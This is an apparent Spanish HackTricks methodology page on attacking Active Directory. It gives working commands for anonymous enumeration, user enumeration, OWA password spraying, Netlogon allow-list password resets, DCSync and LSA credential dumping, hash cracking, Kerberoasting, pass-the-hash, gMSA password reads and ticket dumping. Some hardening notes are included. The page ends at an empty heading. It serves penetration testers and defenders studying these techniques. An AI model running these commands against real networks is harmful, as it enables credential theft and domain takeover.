# Metodología de Active Directory

{{#include ../../banners/hacktricks-training.md}}

## Descripción general básica

**Active Directory** es una tecnología fundamental que permite a los **administradores de red** crear y gestionar de forma eficiente **dominios**, **usuarios** y **objetos** dentro de una red. Está diseñado para escalar y facilitar la organización de un gran número de usuarios en **grupos** y **subgrupos** manejables, controlando los **derechos de acceso** en distintos niveles.

La estructura de **Active Directory** consta de tres capas principales: **dominios**, **árboles** y **bosques**. Un **dominio** abarca un conjunto de objetos, como **usuarios** o **dispositivos**, que comparten una base de datos. Los **árboles** son grupos de estos dominios vinculados por una estructura común, y un **bosque** representa el conjunto de varios árboles interconectados mediante **relaciones de confianza**, formando la capa superior de la estructura organizativa. En cada uno de estos niveles se pueden asignar **derechos de acceso** y **comunicación** específicos.

Los conceptos clave de **Active Directory** incluyen:

1. **Directorio**: almacena toda la información relacionada con los objetos de Active Directory.
2. **Objeto**: representa entidades dentro del directorio, como **usuarios**, **grupos** o **carpetas compartidas**.
3. **Dominio**: sirve como contenedor de objetos del directorio. Pueden coexistir varios dominios dentro de un **bosque**, cada uno con su propia colección de objetos.
4. **Árbol**: grupo de dominios que comparten un dominio raíz.
5. **Bosque**: el nivel más alto de la estructura organizativa de Active Directory, compuesto por varios árboles con **relaciones de confianza** entre ellos.

**Active Directory Domain Services (AD DS)** abarca varios servicios esenciales para la administración centralizada y la comunicación dentro de una red. Estos servicios incluyen:

1. **Servicios de dominio**: centralizan el almacenamiento de datos y gestionan las interacciones entre **usuarios** y **dominios**, incluidas las funciones de **autenticación** y **búsqueda**.
2. **Servicios de certificados**: supervisan la creación, distribución y gestión de **certificados digitales** seguros.
3. **Lightweight Directory Services**: permiten que las aplicaciones habilitadas para directorios usen el **protocolo LDAP**.
4. **Directory Federation Services**: proporcionan capacidades de **inicio de sesión único** para autenticar usuarios en varias aplicaciones web durante una misma sesión.
5. **Administración de derechos**: ayuda a proteger material sujeto a derechos de autor al controlar su distribución y uso no autorizados.
6. **Servicio DNS**: esencial para resolver **nombres de dominio**.

Para obtener una explicación más detallada, consulta: [**TechTerms - Definición de Active Directory**](https://techterms.com/definition/active_directory)

### **Autenticación Kerberos**

Para aprender a **atacar un AD**, es necesario **entender** muy bien el **proceso de autenticación Kerberos**.\
[**Lee esta página si aún no sabes cómo funciona.**](kerberos-authentication.md)

## Cheat Sheet

Puedes consultar [https://wadcoms.github.io/](https://wadcoms.github.io) para obtener rápidamente una lista de los comandos que puedes ejecutar para enumerar/explotar un AD.

> [!WARNING]
> La comunicación Kerberos normalmente **requiere un nombre de dominio completo (FQDN)** para que el cliente pueda obtener un ticket para el SPN correcto. Acceder a una máquina mediante su dirección IP suele hacer que se use NTLM en lugar de Kerberos.

## Reconocimiento de Active Directory (sin creds/sesiones)

Si solo tienes acceso a un entorno AD, pero no tienes credenciales/sesiones, podrías:

- **Hacer pentest de la red:**
  - Escanea la red, encuentra máquinas y puertos abiertos, e intenta **explotar vulnerabilidades** o **extraer credenciales** de ellas (por ejemplo, [las impresoras pueden ser objetivos muy interesantes](ad-information-in-printers.md)).
  - Enumerar DNS podría revelar información sobre servidores clave del dominio, como servidores web, impresoras, recursos compartidos, VPN, contenido multimedia, etc.
    - `gobuster dns -d domain.local -t 25 -w /opt/Seclist/Discovery/DNS/subdomain-top2000.txt`
  - Consulta la [**metodología general de pentesting**](../../generic-methodologies-and-resources/pentesting-methodology.md) para obtener más información sobre cómo hacerlo.
- **Comprueba si los servicios SMB permiten acceso null o Guest** (esto no funcionará en versiones modernas de Windows):
  - `enum4linux -a -u "" -p "" <DC IP> && enum4linux -a -u "guest" -p "" <DC IP>`
  - `smbmap -u "" -p "" -P 445 -H <DC IP> && smbmap -u "guest" -p "" -P 445 -H <DC IP>`
  - `smbclient -U '%' -L //<DC IP> && smbclient -U 'guest%' -L //`
  - Aquí puedes encontrar una guía más detallada sobre cómo enumerar un servidor SMB:


{{#ref}}
../../network-services-pentesting/pentesting-smb/
{{#endref}}

- **Enumera LDAP**
  - `nmap -n -sV --script "ldap* and not brute" -p 389 <DC IP>`
  - Aquí puedes encontrar una guía más detallada sobre cómo enumerar LDAP (presta **especial atención al acceso anónimo**):


{{#ref}}
../../network-services-pentesting/pentesting-ldap.md
{{#endref}}

- **Envenena la red**
  - Recopila credenciales [**suplantando servicios con Responder**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)
  - Accede al host [**abusando del relay attack**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack)
  - Recopila credenciales **exponiendo** [**servicios UPnP falsos con evil-S**](../../generic-methodologies-and-resources/pentesting-network/spoofing-ssdp-and-upnp-devices.md)[**SDP**](https://medium.com/@nickvangilder/exploiting-multifunction-printers-during-a-penetration-test-engagement-28d3840d8856)
- [**OSINT**](https://book.hacktricks.wiki/en/generic-methodologies-and-resources/external-recon-methodology/index.html):
  - Extrae nombres de usuario/nombres de documentos internos, redes sociales y servicios (principalmente web) dentro de los entornos del dominio, así como de fuentes disponibles públicamente.
  - Si encuentras los nombres completos de los empleados de la empresa, podrías probar distintas **convenciones de nombres de usuario** de AD (**[lee esto](https://activedirectorypro.com/active-directory-user-naming-convention/)**). Las convenciones más comunes son: _NameSurname_, _Name.Surname_, _NamSur_ (3 letras de cada nombre), _Nam.Sur_, _NSurname_, _N.Surname_, _SurnameName_, _Surname.Name_, _SurnameN_, _Surname.N_, 3 _letras aleatorias y 3 números aleatorios_ (abc123).
  - Herramientas:
    - [w0Tx/generate-ad-username](https://github.com/w0Tx/generate-ad-username)
    - [urbanadventurer/username-anarchy](https://github.com/urbanadventurer/username-anarchy)

### Enumeración de usuarios

- **Enumeración anónima SMB/LDAP:** consulta las páginas de [**pentesting SMB**](../../network-services-pentesting/pentesting-smb/index.html) y [**pentesting LDAP**](../../network-services-pentesting/pentesting-ldap.md).
- **Enumeración con Kerbrute**: cuando se solicita un **nombre de usuario no válido**, el servidor responde con el código de error **Kerberos** _KRB5KDC_ERR_C_PRINCIPAL_UNKNOWN_, lo que permite determinar que el nombre de usuario no era válido. Para los **nombres de usuario válidos**, se obtiene el **TGT en una respuesta AS-REP** o el error _KRB5KDC_ERR_PREAUTH_REQUIRED_, que indica que el usuario debe realizar la preautenticación.
- **Sin autenticación contra MS-NRPC**: se utiliza auth-level = 1 (sin autenticación) contra la interfaz MS-NRPC (Netlogon) de los controladores de dominio. El método llama a la función `DsrGetDcNameEx2` después de enlazarse con la interfaz MS-NRPC para comprobar si existe el usuario o el equipo, sin usar credenciales. La herramienta [NauthNRPC](https://github.com/sud0Ru/NauthNRPC) implementa este tipo de enumeración. La investigación se puede consultar [aquí](https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2024/05/22190247/A-journey-into-forgotten-Null-Session-and-MS-RPC-interfaces.pdf)<sup>[[11]](#references)</sup>

```bash
./kerbrute_linux_amd64 userenum -d lab.ropnop.com --dc 10.10.10.10 usernames.txt #From https://github.com/ropnop/kerbrute/releases

nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='DOMAIN'" <IP>
Nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<domain>',userdb=/root/Desktop/usernames.txt <IP>

msf> use auxiliary/gather/kerberos_enumusers

crackmapexec smb dominio.es  -u '' -p '' --users | awk '{print $4}' | uniq
python3 nauth.py -t target -u users_file.txt #From https://github.com/sud0Ru/NauthNRPC
```

- **Servidor OWA (Outlook Web Access)**

Si encuentras uno de estos servidores en la red, también puedes realizar **enumeración de usuarios contra él**. Por ejemplo, podrías usar la herramienta [**MailSniper**](https://github.com/dafthack/MailSniper):

```bash
ipmo C:\Tools\MailSniper\MailSniper.ps1
# Get info about the domain
Invoke-DomainHarvestOWA -ExchHostname [ip]
# Enumerate valid users from a list of potential usernames
Invoke-UsernameHarvestOWA -ExchHostname [ip] -Domain [domain] -UserList .\possible-usernames.txt -OutFile valid.txt
# Password spraying
Invoke-PasswordSprayOWA -ExchHostname [ip] -UserList .\valid.txt -Password Summer2021
# Get addresses list from the compromised mail
Get-GlobalAddressList -ExchHostname [ip] -UserName [domain]\[username] -Password Summer2021 -OutFile gal.txt
```

> [!WARNING]
> Puedes encontrar listas de nombres de usuario en [**este repositorio de GitHub**](https://github.com/danielmiessler/SecLists/tree/master/Usernames/Names) y en este otro ([**nombres de usuario estadísticamente probables**](https://github.com/insidetrust/statistically-likely-usernames)).
>
> Sin embargo, deberías tener **los nombres de las personas que trabajan en la empresa** a partir del paso de recon que deberías haber realizado antes. Con el nombre y el apellido, podrías usar el script [**namemash.py**](https://gist.github.com/superkojiman/11076951) para generar posibles nombres de usuario válidos.

### Abuso de la lista de permitidos de canales vulnerables de Netlogon (Onelogon)

Incluso después de aplicar el parche para **Zerologon** en el DC, las cuentas incluidas explícitamente en la lista de permitidos pueden seguir expuestas al **comportamiento heredado/vulnerable del canal seguro de Netlogon**. La configuración riesgosa es la GPO **`Domain controller: Allow vulnerable Netlogon secure channel connections`** o el valor de registro correspondiente **`HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters\VulnerableChannelAllowList`**.

Ese valor es un **descriptor de seguridad SDDL** (consulta [Security Descriptors](security-descriptors.md)). Cualquier cuenta o grupo al que se le haya concedido la ACE pertinente en la DACL puede ser un objetivo. Por ejemplo, `O:BAG:BAD:(A;;RC;;;WD)` incluye efectivamente a **Everyone** en la lista de permitidos.

Flujo de trabajo práctico para el operador:

1. **Identifica las entidades principales incluidas en la lista de permitidos** comprobando tanto **SYSVOL/GPO** como el **registro del DC activo**.
2. **Resuelve los SID** encontrados en el SDDL para identificar los usuarios/equipos reales de AD y prioriza las **cuentas de equipo de DC**, las **cuentas de confianza** y otras máquinas con privilegios.
3. Intenta repetidamente la **autenticación MS-NRPC / Netlogon** como la cuenta incluida en la lista de permitidos.
4. Tras acertar, abusa de la **configuración de contraseñas de Netlogon** para restablecer la contraseña de la cuenta objetivo (la PoC pública la establece como una cadena vacía).<sup>[[9]](#references)[[10]](#references)</sup>

Ejemplos rápidos de triaje/laboratorio del artefacto público:

```bash
# Enumerate allow-listed accounts (scanner requires privileged registry access on the DC)
poetry run scan --dc-ip <DC_IP> --username <USER> --password <PASSWORD>

# Meet-in-the-middle attack against an allow-listed account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>'

# Faster 24-bit brute force when you control another computer account
poetry run onelogon --dc-ip <DC_IP> --dc-name <DC_HOSTNAME> --username '<TARGET_ACCOUNT>' \
  --comp-username '<COMP_ACCOUNT>' --comp-pass '<COMP_PASSWORD>'
```

Notas:

- El **scanner** es útil porque la allow-list efectiva puede estar en **SYSVOL**, en el **registry** o en ambos.
- La ruta del exploit es importante porque **no requiere privilegios de Domain Admin** una vez que se ha identificado una cuenta vulnerable.
- Comprometer una **cuenta de máquina de un Domain Controller**, como `DC$`, es especialmente peligroso porque restablecer esa contraseña puede habilitar directamente rutas más amplias para la **toma de control de AD**.
- La viabilidad del **Brute-force** depende del modo: el artefacto público describe un enfoque meet-in-the-middle, un **Brute-force de 24 bits** cuando hay otra cuenta de equipo disponible y variantes más lentas de **32 bits**.

Notas de detección y hardening:

- Audita la política de allow-list y elimina todo excepto las excepciones temporales de compatibilidad que se requieran explícitamente.
- Supervisa los eventos **5827/5828/5829/5830/5831** del **System** del DC para detectar conexiones Netlogon vulnerables que se deniegan, descubren o permiten explícitamente mediante una política.
- Trata las cuentas de `VulnerableChannelAllowList` como de **alto riesgo** hasta que se elimine la dependencia heredada.

### Conocer uno o varios nombres de usuario

Bien, ya sabes que tienes un nombre de usuario válido, pero ninguna contraseña... Entonces prueba lo siguiente:

- [**ASREPRoast**](asreproast.md): Si un usuario **no tiene** el atributo _DONT_REQ_PREAUTH_, puedes **solicitar un mensaje AS_REP** para ese usuario que contendrá datos cifrados mediante una derivación de la contraseña del usuario.
- [**Password Spraying**](password-spraying.md): Probemos las **contraseñas más comunes** con cada uno de los usuarios descubiertos; quizá algún usuario esté usando una contraseña débil (¡ten en cuenta la política de contraseñas!).
  - Ten en cuenta que también puedes hacer **spraying a servidores OWA** para intentar acceder a los servidores de correo de los usuarios.


{{#ref}}
password-spraying.md
{{#endref}}

### LLMNR/NBT-NS Poisoning

Puede que consigas **obtener** algunos **hashes** de desafío haciendo **poisoning** de algunos protocolos de la **red**:


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

### NTLM Relay

La enumeración de Active Directory proporciona nombres de usuario, identificadores de correo electrónico y patrones de nomenclatura, posibles hosts y servicios a los que se puede inducir a autenticar. Usa ese contexto para identificar posibles [**relay attacks**](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#relay-attack) NTLM y posibles rutas de acceso al entorno de AD.

### Recon basado en workspaces de NetExec y comprobaciones de la postura de relay

- Usa los **workspaces de `nxcdb`** para mantener el estado de reconocimiento de AD por engagement: `workspace create <name>` crea bases de datos SQLite por protocolo en `~/.nxc/workspaces/<name>` (smb/mssql/winrm/ldap/etc). Cambia de vista con `proto smb|mssql|winrm` y enumera los secretos recopilados con `creds`. Elimina manualmente los datos sensibles cuando termines: `rm -rf ~/.nxc/workspaces/<name>`.<sup>[[6]](#references)</sup>
- El descubrimiento rápido de subredes con **`netexec smb <cidr>`** muestra el **dominio**, la **versión del SO**, los **requisitos de SMB signing** y **Null Auth**. Los equipos que muestran `(signing:False)` son **propensos a relay**, mientras que los DC suelen exigir signing.
- Genera **nombres de host en /etc/hosts** directamente a partir de la salida de NetExec para facilitar el targeting:

```bash
netexec smb 10.2.10.0/24 --generate-hosts-file hosts
cat hosts /etc/hosts | sponge /etc/hosts
```

- Cuando **SMB relay al DC está bloqueado** por la firma, sigue comprobando la postura de **LDAP**: `netexec ldap <dc>` destaca `(signing:None)` / channel binding débil. Un DC que requiere SMB signing pero tiene LDAP signing deshabilitado sigue siendo un objetivo viable para **relay-to-LDAP** en abusos como **SPN-less RBCD**.

### Filtraciones de credenciales en impresoras → validación masiva de credenciales de dominio

- Las interfaces web de impresoras a veces **incluyen contraseñas de admin enmascaradas en el HTML**. Ver el código fuente o usar las herramientas de desarrollo puede revelar el texto sin cifrar (por ejemplo, `<input value="<password>">`), lo que permite acceder mediante Basic-auth a repositorios de escaneo e impresión.
- Los trabajos de impresión obtenidos pueden contener **documentos de incorporación en texto sin cifrar** con contraseñas de cada usuario. Mantén alineadas las correspondencias al probar:<sup>[[6]](#references)</sup>

```bash
cat IT_Procedures.txt | grep Username: | cut -d' ' -f2 > usernames
cat IT_Procedures.txt | grep Password: | cut -d' ' -f3 > passwords
netexec smb <dc> -u usernames -p passwords --no-bruteforce --continue-on-success
```

### Robar credenciales NTLM

Si puedes **acceder a otros PCs o recursos compartidos** con el **usuario null o guest**, podrías **colocar archivos** (como un archivo SCF) que, si alguien los abre, pueden **desencadenar una autenticación NTLM contra ti** para que puedas **robar** el **desafío NTLM** y descifrarlo:


{{#ref}}
../ntlm/places-to-steal-ntlm-creds.md
{{#endref}}

### Hash Shucking & NT-Candidate Attacks

**Hash shucking** trata cada hash NT que ya tienes como una contraseña candidata para otros formatos más lentos cuyo material de clave se deriva directamente del hash NT. En lugar de aplicar fuerza bruta a frases de contraseña largas en tickets Kerberos RC4, desafíos NetNTLM o credenciales almacenadas en caché, introduces los hashes NT en los modos NT-candidate de Hashcat y dejas que valide la reutilización de contraseñas sin tener que conocer nunca el texto plano. Esto es especialmente eficaz después de comprometer un dominio, cuando puedes obtener miles de hashes NT actuales e históricos.<sup>[[5]](#references)</sup>

Usa shucking cuando:

- Tienes un corpus de hashes NT obtenido mediante DCSync, volcados de SAM/SECURITY o almacenes de credenciales y necesitas probar si se reutilizan en otros dominios/bosques.
- Capturas material Kerberos basado en RC4 (`$krb5tgs$23$`, `$krb5asrep$23$`), respuestas NetNTLM o blobs DCC/DCC2.
- Quieres demostrar rápidamente la reutilización de frases de contraseña largas e imposibles de descifrar y pivotar de inmediato mediante Pass-the-Hash.

La técnica **no funciona** con tipos de cifrado cuyas claves no sean el hash NT (p. ej., Kerberos etype 17/18 AES). Si un dominio exige solo AES, debes volver a los modos de contraseña habituales.

#### Crear un corpus de hashes NT

- **DCSync/NTDS** – Usa `secretsdump.py` con el historial para obtener el mayor conjunto posible de hashes NT (y sus valores anteriores):

  ```bash
  secretsdump.py <domain>/<user>@<dc_ip> -just-dc-ntlm -history -user-status -outputfile smoke_dump
  grep -i ':::' smoke_dump.ntds | awk -F: '{print $4}' | sort -u > nt_candidates.txt
  ```

  Las entradas del historial amplían enormemente el conjunto de candidatos porque Microsoft puede almacenar hasta 24 hashes anteriores por cuenta. Para conocer más formas de extraer secretos de NTDS, consulta:

{{#ref}}
dcsync.md
{{#endref}}

- **Volcados de caché de endpoints** – `nxc smb <ip> -u <local_admin> -p <password> --local-auth --lsa` (o Mimikatz `lsadump::sam /patch`) extrae datos locales de SAM/SECURITY y los inicios de sesión de dominio almacenados en caché (DCC/DCC2). Elimina duplicados y añade esos hashes a la misma lista `nt_candidates.txt`.
- **Seguimiento de metadatos** – Conserva el nombre de usuario/dominio que produjo cada hash (aunque la wordlist solo contenga valores hexadecimales). Cuando Hashcat muestre el candidato correcto, los hashes coincidentes te indicarán de inmediato qué principal está reutilizando una contraseña.
- Da prioridad a los candidatos del mismo forest o de un forest de confianza; esto maximiza la probabilidad de coincidencia durante el shucking.

#### Modos de candidatos NT de Hashcat

| Tipo de hash                             | Modo de contraseña | Modo de candidatos NT |
| ---------------------------------------- | ------------------ | --------------------- |
| Domain Cached Credentials (DCC)          | 1100               | 31500                 |
| Domain Cached Credentials 2 (DCC2)       | 2100               | 31600                 |
| NetNTLMv1 / NetNTLMv1+ESS                | 5500               | 27000                 |
| NetNTLMv2                                | 5600               | 27100                 |
| Kerberos 5 etype 23 AS-REQ Pre-Auth      | 7500               | _N/A_                 |
| Kerberos 5 etype 23 TGS-REP (Kerberoast) | 13100              | 35300                 |
| Kerberos 5 etype 23 AS-REP               | 18200              | 35400                 |

Notas:

- Las entradas para candidatos NT **deben seguir siendo hashes NT sin procesar de 32 caracteres hexadecimales**. Desactiva los motores de reglas (sin `-r` ni modos híbridos), ya que las transformaciones corrompen el material de clave del candidato.
- Estos modos no son más rápidos por naturaleza, pero el keyspace de NTLM (~30.000 MH/s en un M3 Max) es ~100× más rápido que Kerberos RC4 (~300 MH/s). Probar una lista de NT seleccionada cuesta mucho menos que explorar todo el espacio de contraseñas en el formato lento.
- Usa siempre la **versión más reciente de Hashcat** (`git clone https://github.com/hashcat/hashcat && make install`), ya que los modos 31500/31600/35300/35400 se añadieron recientemente.<sup>[[7]](#references)</sup>
- Actualmente no hay un modo NT para AS-REQ Pre-Auth, y los etypes AES (19600/19700) requieren la contraseña en texto plano porque sus claves se derivan mediante PBKDF2 a partir de contraseñas UTF-16LE, no de hashes NT sin procesar.

#### Ejemplo: Kerberoast RC4 (modo 35300)

1. Captura un TGS RC4 para un SPN objetivo con un usuario con pocos privilegios (consulta la página de Kerberoast para más detalles):

{{#ref}}
kerberoast.md
{{#endref}}

   ```bash
   GetUserSPNs.py -dc-ip <dc_ip> -request <domain>/<user> -outputfile roastable_TGS
   ```

2. Extrae el ticket con tu lista NT:

   ```bash
   hashcat -m 35300 roastable_TGS nt_candidates.txt
   ```

   Hashcat deriva la clave RC4 de cada candidato NT y valida el blob `$krb5tgs$23$...`. Una coincidencia confirma que la cuenta de servicio usa uno de tus hashes NT existentes.

3. Pivota inmediatamente mediante PtH:

   ```bash
   nxc smb <dc_ip> -u roastable -H <matched_nt_hash>
   ```

   Opcionalmente, puedes recuperar el texto en claro más tarde con `hashcat -m 1000 <matched_hash> wordlists/` si es necesario.

#### Ejemplo: credenciales en caché (mode 31600)

1. Extrae los inicios de sesión en caché de una workstation comprometida:

   ```bash
   nxc smb <host_ip> -u localadmin -p '<password>' --local-auth --lsa > lsa_dump.txt
   ```

2. Copia la línea DCC2 del usuario de dominio interesante en `dcc2_highpriv.txt` y aplícale shucking:

   ```bash
   hashcat -m 31600 dcc2_highpriv.txt nt_candidates.txt
   ```

3. Una coincidencia exitosa produce el hash NT que ya conoces y tienes en tu lista, lo que demuestra que el usuario almacenado en caché está reutilizando una contraseña. Úsalo directamente para PtH (`nxc smb <dc_ip> -u highpriv -H <hash>`) o fuerza su recuperación en modo NTLM rápido.

El mismo flujo de trabajo se aplica a las respuestas a desafíos NetNTLM (`-m 27000/27100`) y DCC (`-m 31500`). Una vez identificada una coincidencia, puedes iniciar un relay, usar PtH con SMB/WMI/WinRM o volver a descifrar el hash NT sin conexión con máscaras/reglas.



## Enumeración de Active Directory CON credenciales/sesión

Para esta fase, debes haber **comprometido las credenciales o una sesión de una cuenta válida del dominio.** Si tienes credenciales válidas o una shell como usuario del dominio, **recuerda que las opciones mencionadas anteriormente siguen siendo útiles para comprometer a otros usuarios**.

Antes de comenzar la enumeración autenticada, entiende el **problema del doble salto de Kerberos**.


{{#ref}}
kerberos-double-hop-problem.md
{{#endref}}

### Enumeración

Comprometer una cuenta es un **paso importante para evaluar el dominio**, ya que permite la **enumeración autenticada de Active Directory**:

En cuanto a [**ASREPRoast**](asreproast.md), ahora puedes encontrar todos los usuarios potencialmente vulnerables; y, para [**Password Spraying**](password-spraying.md), puedes obtener una **lista de todos los nombres de usuario** y probar la contraseña de la cuenta comprometida, contraseñas vacías y otras contraseñas prometedoras.

- Puedes usar [**CMD para realizar un reconocimiento básico**](../basic-cmd-for-pentesters.md#domain-info)
- También puedes usar [**powershell para reconocimiento**](../basic-powershell-for-pentesters/index.html), que será más sigiloso
- También puedes [**usar powerview**](../basic-powershell-for-pentesters/powerview.md) para extraer información más detallada
- Otra herramienta excelente para el reconocimiento en un Active Directory es [**BloodHound**](bloodhound.md). **No es muy sigilosa** (depende de los métodos de recopilación que uses), pero **si no te importa**, deberías probarla. Encuentra dónde pueden usar RDP los usuarios, busca rutas hacia otros grupos, etc.
  - **Otras herramientas automatizadas de enumeración de AD son:** [**AD Explorer**](bloodhound.md#ad-explorer)**,** [**ADRecon**](bloodhound.md#adrecon)**,** [**Group3r**](bloodhound.md#group3r)**,** [**PingCastle**](bloodhound.md#pingcastle)**.**
- Revisa los [**registros DNS de AD**](ad-dns-records.md), ya que pueden contener información interesante.
- Una **herramienta con GUI** que puedes usar para enumerar el directorio es **AdExplorer.exe**, de la suite **SysInternal**.
- También puedes buscar credenciales en la base de datos LDAP con **ldapsearch**, en los campos _userPassword_ y _unixUserPassword_, e incluso en las notas _description_ e _info_ de los usuarios. Un token con aspecto de contraseña, sin etiqueta, en _info_ es solo un posible indicio: confirma por separado su propósito y validez, y evita incluir el contenido de las notas en la salida habitual de enumeración. Consulta [Contraseña en el comentario de usuario de AD en PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Active%20Directory%20Attack.md#password-in-ad-user-comment) para ver otros métodos.
- Revisa los scripts de inicio de sesión y asignación de unidades del dominio a los que tengas **acceso**, en `\\<dc>\NETLOGON` o `\\<dc>\SYSVOL\<domain>\scripts`, siempre que tengas autorización. [Microsoft documenta](https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/netlogon-share-not-present-after-install-ad-ds-on-full-read-only-domain-controller) la función del directorio de scripts del recurso compartido NETLOGON. Primero enumera los nombres y luego inspecciona solo los scripts pertinentes y legibles, respetando un límite de tamaño; no vuelques todo el recurso compartido ni muestres valores de credenciales durante la enumeración habitual. Una llamada de PowerShell a [`ConvertTo-SecureString -AsPlainText`](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertto-securestring) **no** protege una contraseña literal almacenada en el script. La llamada por sí sola no demuestra que haya un secreto codificado directamente: rastrea su entrada real y luego verifica por separado la cuenta, la validez de las credenciales y los privilegios. Revisar un script del dominio en un recurso compartido remoto es una tarea distinta de enumerar un host local.
- Si usas **Linux**, también puedes enumerar el dominio con [**pywerview**](https://github.com/the-useless-one/pywerview).
- También puedes probar herramientas automatizadas como:
  - [**tomcarver16/ADSearch**](https://github.com/tomcarver16/ADSearch)
  - [**61106960/adPEAS**](https://github.com/61106960/adPEAS)
- **Extraer todos los usuarios del dominio**

  Es muy fácil obtener todos los nombres de usuario del dominio desde Windows (`net user /domain` ,`Get-DomainUser` o `wmic useraccount get name,sid`). En Linux, puedes usar: `GetADUsers.py -all -dc-ip 10.10.10.110 domain.com/username` o `enum4linux -a -u "user" -p "password" <DC IP>`

> Aunque esta sección de enumeración parezca breve, es la parte más importante de todas. Accede a los enlaces (principalmente a los de cmd, powershell, powerview y BloodHound), aprende a enumerar un dominio y practica hasta sentirte cómodo. Durante una evaluación, este será el momento clave para encontrar el camino hacia DA o decidir que no se puede hacer nada.

### Cuentas de equipo precreadas predecibles -> acceso a contraseñas gMSA

Las cuentas de equipo preparadas para uniones heredadas pueden conservar una contraseña inicial predecible. El módulo `pre2k` de NetExec identifica el valor característico `userAccountControl` `4128` (`WORKSTATION_TRUST_ACCOUNT | PASSWD_NOTREQD`) e intenta obtener un TGT de Kerberos usando los primeros 14 caracteres del nombre del equipo en minúsculas, sin el `$` final. Considera este valor de UAC como un selector de candidatos, en lugar de asumir que pertenecer a **Pre-Windows 2000 Compatible Access** demuestra por sí solo que la contraseña es débil.<sup>[[18]](#references)[[20]](#references)</sup>

Usa la enumeración LDAP autenticada para probar los candidatos y guardar los TGT obtenidos correctamente. `ALL=True` amplía las pruebas a objetos que no coincidan con el filtro predeterminado `4128`.<sup>[[18]](#references)</sup>

```bash
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k
netexec ldap dc.corp.local -u auditor -p 'Password!' -M pre2k -o ALL=True

# Validate a candidate explicitly with Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k
```

Un fallo en el bind predeterminado/NTLM **no** invalida este hallazgo: prueba con `-k`, un FQDN que resuelva a la DC y un reloj sincronizado con el KDC. Las ejecuciones correctas del módulo escriben listas de candidatos y ccaches obtenidos en `~/.nxc/modules/pre2k/`.<sup>[[18]](#references)[[20]](#references)</sup>

Tras comprometer el principal de equipo, analiza sus membresías en grupos anidados y sus permisos salientes. En particular, los principales incluidos en el descriptor de seguridad `msDS-GroupMSAMembership` de una gMSA pueden leer `msDS-ManagedPassword`; la salida de `--gmsa` de NetExec muestra los principales autorizados y devuelve el hash NT actual si el equipo que se autentica está autorizado.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Enumerate gMSAs and their password readers with the initial user
netexec ldap dc.corp.local -u auditor -p 'Password!' --gmsa

# Re-query as the compromised computer through Kerberos
netexec ldap dc.corp.local -u 'APP01$' -p app01 -k --gmsa
```

Luego evalúa la gMSA recuperada como cualquier otra credencial: inspecciona la pertenencia a grupos locales/del dominio, los derechos de inicio de sesión, los SPN, la delegación y los servicios accesibles antes de intentar pass-the-hash. Esta vía de recuperación basada en ACL es distinta de [Golden gMSA/dMSA](golden-dmsa-gmsa.md), que deriva contraseñas administradas después de comprometer la clave raíz de KDS.<sup>[[20]](#references)</sup>

Una entidad de equipo también puede tener control saliente sobre otros objetos de equipo o grupos. Después de obtener una, inspecciona por separado sus pertenencias anidadas y ACL efectivas: un permiso de escritura sobre otro objeto de equipo puede permitir cambiar una cuenta, y los permisos de pertenencia a grupos pueden llevar a un rol de inicio de sesión. Un indicador de cuenta provisional, una convención de nombres predecible o una relación `GenericWrite` por sí solos no demuestran la ruta completa.

Una copia legible de un blob `msDS-ManagedPassword` en un archivo, recurso compartido o copia de seguridad constituye una vía de exposición independiente: la ACL de lectura LDAP no protege una copia almacenada en otro lugar. Valida que los datos sean un blob de contraseña administrada antes de interpretarlos y distingue este caso tanto de una lectura LDAP autorizada como de la derivación mediante la clave raíz de KDS.

### Kerberoast

Kerberoasting consiste en obtener **tickets TGS** usados por servicios asociados a cuentas de usuario y crackear su cifrado, que se basa en las contraseñas de usuario, **offline**.

Más información:


{{#ref}}
kerberoast.md
{{#endref}}

### Conexión remota (RDP, SSH, FTP, Win-RM, etc.)

Una vez que hayas obtenido algunas credenciales, puedes comprobar si tienes acceso a alguna **máquina**. Para ello, puedes usar **CrackMapExec** para intentar conectarte a varios servidores con distintos protocolos, de acuerdo con tus escaneos de puertos.

### Escalada de privilegios local

Si has comprometido credenciales o tienes una sesión como usuario normal del dominio y puedes acceder a **cualquier máquina del dominio**, busca una vía para **escalar privilegios localmente y recopilar credenciales**. Los privilegios de administrador local pueden permitirte **volcar los hashes de otros usuarios** desde la memoria (LSASS) y el almacenamiento local (SAM).

En este libro hay una página completa sobre la [**escalada de privilegios local en Windows**](../windows-local-privilege-escalation/index.html) y una [**lista de comprobación**](../checklist-windows-privilege-escalation.md). Además, no olvides usar [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite).

### Tickets de la sesión actual

Es muy **poco probable** que encuentres **tickets** en el usuario actual que **te den permiso para acceder** a recursos inesperados, pero puedes comprobarlo:

```bash
## List all tickets (if not admin, only current user tickets)
.\Rubeus.exe triage
## Dump the interesting one by luid
.\Rubeus.exe dump /service:krbtgt /luid:<luid> /nowrap
[IO.File]::WriteAllBytes("ticket.kirbi", [Convert]::FromBase64String("<BASE64_TICKET>"))
```

### NTLM Relay

